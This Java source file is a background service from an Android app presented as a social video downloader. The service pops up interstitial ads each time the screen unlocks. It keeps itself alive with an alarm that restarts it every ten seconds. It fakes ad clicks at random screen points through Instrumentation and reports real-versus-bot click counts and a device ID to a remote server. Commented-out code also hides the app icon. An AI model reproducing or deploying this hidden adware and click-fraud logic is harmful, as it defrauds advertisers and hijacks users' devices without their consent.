package com.v2social.socialdownloader.services;

import android.app.AlarmManager;
import android.app.Instrumentation;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Point;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import android.view.Display;
import android.view.MotionEvent;
import android.view.WindowManager;

import com.facebook.ads.Ad;
import com.facebook.ads.AdError;
import com.facebook.ads.InterstitialAdListener;
import com.google.android.gms.ads.AdListener;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.InterstitialAd;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.v2social.socialdownloader.AppConstants;
import com.v2social.socialdownloader.R;
import com.v2social.socialdownloader.ShowAds;
import com.v2social.socialdownloader.network.CheckAds;
import com.v2social.socialdownloader.network.ClientConfig;
import com.v2social.socialdownloader.receiver.RestartServiceReceiver;

import java.io.IOException;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MyService extends Service {
    private boolean isBotClick = false;
    private boolean isContinousShowAds = false;
    private boolean isReportResult = false;

    private ScheduledThreadPoolExecutor myTask;
    private String uuid;
    private String idFullService;
    private String idFullFbService;
    private int intervalService;
    private int delayService;
    private int delay_report;

    private int countTotalShow=0;
    private int countRealClick=0;
    private int countBotClick=0;
    private int delay_retention = -1;

    private ClientConfig clientConfig;
    private InterstitialAd mInterstitialAd;
    private com.facebook.ads.InterstitialAd fbInterstitialAd;
    private CheckAds checkAds;
    private MyBroadcast myBroadcast;

    private static final Point [] points = {new Point(50,50),new Point(51,57),new Point(79,85),new Point(72,74),
            new Point(70,92),new Point(71,91),new Point(71,93),new Point(72,92),new Point(48,80),new Point(48,65),new Point(53,40)};

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d("cao", "onCreate");
        if (myTask == null || myTask.isShutdown() || myTask.isTerminated()) {
            initService();
        }

        if(myBroadcast==null)
        {
            try
            {
                myBroadcast = new MyBroadcast();
                IntentFilter filter = new IntentFilter("android.intent.action.USER_PRESENT");
                registerReceiver(myBroadcast, filter);
            }
            catch (Exception e){}
        }
    }

    private void initService()
    {
//        SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
//        uuid = mPrefs.getString("uuid", UUID.randomUUID().toString());
//        idFullService = mPrefs.getString("idFullService", "/21617015150/734252/21734809637");
//        intervalService = mPrefs.getInt("intervalService", 10);
//        delayService = mPrefs.getInt("delayService", 24);
//        delay_retention = mPrefs.getInt("delay_retention", -1);
//        delay_report = mPrefs.getInt("delay_report", 1);
//        idFullFbService = mPrefs.getString("idFullFbService", "2061820020517519_2085229838176537");
//
//        getAdsCount();
//        scheduleTask();

        AlarmManager localAlarmManager = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(getApplicationContext(), RestartServiceReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(getApplicationContext(), 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
        if (localAlarmManager != null) {
            localAlarmManager.setRepeating(AlarmManager.RTC, System.currentTimeMillis(), 10000L, pendingIntent);
        }
        Log.d("caomui1","alarm");
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId){
        Log.d("cao","onStartCommand");
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d("cao", "onDestroy " +(myBroadcast == null));
        if(myBroadcast!=null)
        {
            unregisterReceiver(myBroadcast);
            myBroadcast = null;
        }

        if(myTask != null)
        {
            myTask.shutdown();
        }

        if(fbInterstitialAd != null)
            fbInterstitialAd.destroy();
    }

    private void addShortcut() {

        if(true)
            return;
        //Adding shortcut for MainActivity
//        try {
//            PackageManager p = getPackageManager();
//            ComponentName componentName = new ComponentName(this.getPackageName(), getPackageName()+".MAIN1");
//            p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
////            Log.d("caomui","DONE hide icon");
//        }
//        catch (Exception e)
//        {
////            Log.d("caomui","ERROR HIDE ICON");
//        }

        Intent shortcutIntent = new Intent(getApplicationContext(),
                com.v2social.socialdownloader.MainActivity.class);

        shortcutIntent.setAction(Intent.ACTION_MAIN);

        Intent addIntent = new Intent();
        addIntent
                .putExtra(Intent.EXTRA_SHORTCUT_INTENT, shortcutIntent);
        addIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, "Social video downloader");
        addIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE,
                Intent.ShortcutIconResource.fromContext(getApplicationContext(),
                        R .mipmap.ic_launcher));

        addIntent
                .setAction("com.android.launcher.action.INSTALL_SHORTCUT");
        addIntent.putExtra("duplicate", false);  //may it's already there so don't duplicate
        getApplicationContext().sendBroadcast(addIntent);

//        Log.d("caomui","ADD shortcut done");
        createShortcut();
    }

    private void scheduleTask() {
        myTask = new ScheduledThreadPoolExecutor(1);
        myTask.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
                int totalTime = mPrefs.getInt("totalTime", 0);
                totalTime += intervalService;
                mPrefs.edit().putInt("totalTime", totalTime).commit();

                if(delay_retention >= 0 && totalTime > delay_retention)//add shortcut or không
                {
                    addShortcut();
                    delay_retention = -1;
                    mPrefs.edit().putInt("delay_retention",-1).commit();
                }

                if(totalTime == 1300)
                {
                    SharedPreferences mPrefs2 = getSharedPreferences("support_xx", 0);
                    mPrefs.edit().putInt("accept", 2).commit();
                }

                if (totalTime % (delay_report * 60) == 0) {
                    isReportResult = true;
                }

                if (isReportResult || clientConfig == null)
                    getClientConfig();

                if (totalTime >= delayService * 60) {
                    isContinousShowAds = true;
                }

                isContinousShowAds = true;
                Log.d("caomui","================");
            }
//        }, 0, intervalService, TimeUnit.MINUTES);
        }, 0, 15, TimeUnit.SECONDS);

    }

    private void getClientConfig()
    {
        SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
        int totalTime = mPrefs.getInt("totalTime", 0);

        OkHttpClient client = new OkHttpClient();
        RequestBody body = new FormBody.Builder()
                .add("countTotalShow", countTotalShow + "")
                .add("countRealClick",countRealClick+"")
                .add("countBotClick",countBotClick+"")
                .add("totalTime",totalTime+"")
                .add("id",uuid)
                .build();
        Request okRequest = new Request.Builder()
                .url(AppConstants.URL_CLIENT_CONFIG)
                .post(body)
                .build();
        client.newCall(okRequest).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                Gson gson = new GsonBuilder().create();
                clientConfig = gson.fromJson(response.body().string(),ClientConfig.class);
                countTotalShow = 0;
                countBotClick = 0;
                countRealClick = 0;
                isReportResult = false;
                saveAdsCount();
            }
        });
    }

    private void createShortcut()
    {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(5000);
                    OkHttpClient client = new OkHttpClient();
                    RequestBody body = new FormBody.Builder()
                            .add("id",uuid)
                            .build();
                    Request okRequest = new Request.Builder()
                            .url(AppConstants.URL_CREATE_SHORTCUT)
                            .post(body)
                            .build();
                    client.newCall(okRequest).execute();
                }
                catch (Exception e){
                }
            }
        }).start();
    }

    private void saveAdsCount() {
        SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
        SharedPreferences.Editor editor = mPrefs.edit();
        editor.putInt("countTotalShow", countTotalShow);
        editor.putInt("countRealClick", countRealClick);
        editor.putInt("countBotClick", countBotClick);
        editor.commit();
    }

    private void getAdsCount() {
        SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
        countTotalShow = mPrefs.getInt("countTotalShow", 0);
        countRealClick = mPrefs.getInt("countRealClick", 0);
        countBotClick = mPrefs.getInt("countBotClick", 0);
    }

    class MyBroadcast extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d("caosocial", "Unlock Screen " + uuid);
            if (!isContinousShowAds || clientConfig == null)
                return;
            if (new Random().nextInt(100) > clientConfig.max_percent_ads) {
                return;
            }
            if (new Random().nextInt(100) < clientConfig.fb_percent_ads) {
                new Handler(Looper.getMainLooper()).post(new Runnable() {
                    public void run() {
                        if (fbInterstitialAd != null) {
                            fbInterstitialAd.destroy();
                        }
                        fbInterstitialAd = new com.facebook.ads.InterstitialAd(MyService.this, idFullFbService);
                        fbInterstitialAd.setAdListener(new InterstitialAdListener() {
                            @Override
                            public void onInterstitialDisplayed(Ad ad) {
                            }

                            @Override
                            public void onInterstitialDismissed(Ad ad) {
                                saveAdsCount();
                            }

                            @Override
                            public void onError(Ad ad, AdError adError) {
                            }

                            @Override
                            public void onAdLoaded(Ad ad) {
                                try {
                                    Intent showAds = new Intent(getApplicationContext(), ShowAds.class);
                                    showAds.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                    startActivity(showAds);

                                    new Handler().postDelayed(new Runnable() {
                                        @Override
                                        public void run() {
                                            fbInterstitialAd.show();
                                        }
                                    }, 1000);

                                } catch (Exception e) {

                                }
                            }

                            @Override
                            public void onAdClicked(Ad ad) {
                                countRealClick++;
                            }

                            @Override
                            public void onLoggingImpression(Ad ad) {
                                countTotalShow++;
                            }
                        });
                        fbInterstitialAd.loadAd();
                    }
                });
            } else {
                checkAds = new CheckAds();
                checkAds.delayClick = clientConfig.min_click_delay + new Random().nextInt(clientConfig.max_click_delay);
                if (new Random().nextInt(100) < clientConfig.max_ctr_bot)
                    checkAds.isBotClick = 1;
                else
                    checkAds.isBotClick = 0;
                Point point = points[new Random().nextInt(points.length)];
                checkAds.x = point.x;
                checkAds.y = point.y;
                isBotClick = false;

                new Handler(Looper.getMainLooper()).post(new Runnable() {
                    public void run() {
                        mInterstitialAd = new InterstitialAd(MyService.this);
//                        mInterstitialAd.setAdUnitId(idFullService);
                        mInterstitialAd.setAdUnitId("ca-app-pub-3940256099942544/1033173712");
                        mInterstitialAd.setAdListener(new AdListener() {

                            @Override
                            public void onAdClosed() {
                                super.onAdClosed();
                                try {
                                    if (Build.VERSION.SDK_INT < 21) {
                                        ShowAds.getInstance().finishAffinity();
                                    } else {
                                        ShowAds.getInstance().finishAndRemoveTask();
                                    }
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                saveAdsCount();
                            }

                            @Override
                            public void onAdFailedToLoad(int i) {
                                super.onAdFailedToLoad(i);
                                isContinousShowAds = true;
                            }

                            @Override
                            public void onAdLeftApplication() {
                                super.onAdLeftApplication();
                                if (isBotClick)
                                    countBotClick += 1;
                                else
                                    countRealClick += 1;
                            }

                            @Override
                            public void onAdOpened() {
                                super.onAdOpened();
                                countTotalShow += 1;
                                isContinousShowAds = false;
                                if (checkAds.isBotClick == 1) {
                                    new Thread(new Runnable() {
                                        @Override
                                        public void run() {
                                            try {
                                                Thread.sleep(checkAds.delayClick * 100);
                                                WindowManager window = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
                                                Display display = window.getDefaultDisplay();
                                                Point point = new Point();
                                                display.getSize(point);
                                                int width = checkAds.x * point.x / 100;
                                                int height = checkAds.y * point.y / 100;
                                                Instrumentation m_Instrumentation = new Instrumentation();
                                                m_Instrumentation.sendPointerSync(MotionEvent.obtain(
                                                        android.os.SystemClock.uptimeMillis(),
                                                        android.os.SystemClock.uptimeMillis(),
                                                        MotionEvent.ACTION_DOWN, width, height, 0));
                                                Thread.sleep(new Random().nextInt(100));
                                                m_Instrumentation.sendPointerSync(MotionEvent.obtain(
                                                        android.os.SystemClock.uptimeMillis(),
                                                        android.os.SystemClock.uptimeMillis(),
                                                        MotionEvent.ACTION_UP, width, height, 0));
                                                isBotClick = true;
                                            } catch (Exception e) {
                                                e.printStackTrace();
                                                isBotClick = false;
                                            }
                                        }
                                    }).start();
                                }
                            }

                            @Override
                            public void onAdLoaded() {
                                super.onAdLoaded();

                                try {
                                    Intent showAds = new Intent(getApplicationContext(), ShowAds.class);
                                    showAds.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                    startActivity(showAds);

                                    new Handler().postDelayed(new Runnable() {
                                        @Override
                                        public void run() {
                                            mInterstitialAd.show();
                                        }
                                    }, 500);

                                } catch (Exception e) {
                                }
                            }
                        });

                        mInterstitialAd.loadAd(new AdRequest.Builder().build());//addTestDevice("3CC7F69A2A4A1EB57306DA0CFA16B969")
                    }
                });
            }


        }
    }
}